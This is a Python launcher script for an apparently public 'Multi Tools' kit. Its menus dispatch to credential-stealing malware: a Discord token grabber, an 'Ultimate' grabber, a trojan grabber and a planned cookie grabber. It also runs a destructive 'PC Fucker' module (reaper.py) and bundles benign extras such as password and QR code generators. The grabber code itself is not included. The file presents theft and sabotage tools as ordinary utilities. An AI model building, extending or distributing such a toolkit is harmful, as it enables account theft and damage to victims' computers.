import os
import json
from datetime import date
from requests import get, post
from random import randint
import time
from colorama import Fore, Style, init
from data.scripts.discord_tools import dc_tools
from data.scripts.tutorial import tuto
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW("Multi Tools v1.6 | https://github.com/itssnee/multi-tools ")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()

with open('./config/config.json') as f:
   config = json.load(f)
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def additional():
    print(bcolors.OKBLUE + """
   _____       .___  .___.__  __  .__                     .__   
  /  _  \    __| _/__| _/|__|/  |_|__| ____   ____ _____  |  |  
 /  /_\  \  / __ |/ __ | |  \   __\  |/  _ \ /    \\__  \ |  |  
/    |    \/ /_/ / /_/ | |  ||  | |  (  <_> )   |  \/ __ \|  |__
\____|__  /\____ \____ | |__||__| |__|\____/|___|  (____  /____/
        \/      \/    \/                         \/     \/      
                                          

              Options  
             """)
    print(bcolors.OKBLUE + """
          [1]Strong Password Gen
          [2]QR Code Creator
          [3]Anonfiles link Gen
          [0]Back
          """)
    USER_OPTION3 = input(bcolors.OKBLUE +    "[>] ")
    if USER_OPTION3 == "1":
        clearcmd()
        os.system('python ./data/scripts/password_gen.py')
    elif USER_OPTION3 == "0":
        clearcmd()
        zyzz()
    elif USER_OPTION3 == "2":
        clearcmd()
        os.system('python ./data/scripts/qrcode_gen.py')
    elif USER_OPTION3 == "3":
        clearcmd()
        os.system('python ./data/scripts/anonfiles_gen.py')
        
def grabbers():
  print(bcolors.OKBLUE + """
    ________            ___.  ___.                        
 /  _____/___________ \_ |__\_ |__   ___________  ______
/   \  __\_  __ \__  \ | __ \| __ \_/ __ \_  __ \/  ___/
\    \_\  \  | \// __ \| \_\ \ \_\ \  ___/|  | \/\___ \ 
 \______  /__|  (____  /___  /___  /\___  >__|  /____  >
        \/           \/    \/    \/     \/           \/ 
                                          

              Options  
        """)
  print(bcolors.OKBLUE + """
  [1] Discord Token Grabber
  [2] Ultimate Grabber
  [3] Trojan Grabber
  [4] Cookie Grabber
  [0] Back
  """)
  USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
  if USER_OPTION2 == "1":
    clearcmd()
    os.system('python ./data/grabber_scripts/discord_grabber.py')
  elif USER_OPTION2 == "0":
        clearcmd()
        zyzz()
  elif USER_OPTION2 == "2":
       clearcmd()
       os.system('python ./data/grabber_scripts/ultimate_grabber.py')
  elif USER_OPTION2 == "3":
       clearcmd()
       os.system('python ./data/grabber_scripts/blank_grabber.py')
  elif USER_OPTION2 == "4":
       clearcmd()
       input("currently in development, press enter to restart...")
       clearcmd()
       grabbers()

def zyzz():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + "https://github.com/itssnee/multi-tools/")
  print(bcolors.OKBLUE + """                      
   _____        .__   __  .__  ___________           .__   
  /     \  __ __|  |_/  |_|__| \__    ___/___   ____ |  |  
 /  \ /  \|  |  \  |\   __\  |   |    | /  _ \ /  _ \|  |  
/    Y    \  |  /  |_|  | |  |   |    |(  <_> |  <_> )  |__
\____|__  /____/|____/__| |__|   |____| \____/ \____/|____/
                                  

              Options                                                                 
        """)
  print(bcolors.OKBLUE + """
    [1] Discord Tools
    [2] Grabbers
    [3] Tutorial
    [4] Additional Functions
    [5] PC Fucker (will fuck ur pc)
    [6] Credits
    """)
  USER_OPTION = input(bcolors.OKBLUE +    "[>] ")
  if USER_OPTION == "1":
    clearcmd()
    dc_tools()
  elif USER_OPTION == "3":
    clearcmd()
    tuto()
  elif USER_OPTION == "2":
    clearcmd()
    grabbers()
  elif USER_OPTION == "4":
    clearcmd()
    additional()
  elif USER_OPTION == "5":
    clearcmd()
    os.system('python ./modules/reaper.py')
  elif USER_OPTION == "6":
    clearcmd()
    print("""
    multi tools - a project by Snee and Stremz
    github.com/itssnee
    github.com/itsstremz
    dev who is allowed to resell or reuse the code as his own:
    github.com/itssens
    """)
    time.sleep(2.00)
    input("to restart the program, press enter.")
    clearcmd()
    zyzz()
zyzz()
#made by snee the goat
#we love snee
#snee is smash
#snee is king
#github.com/itssnee
#github.com/itssnee/multi-tools
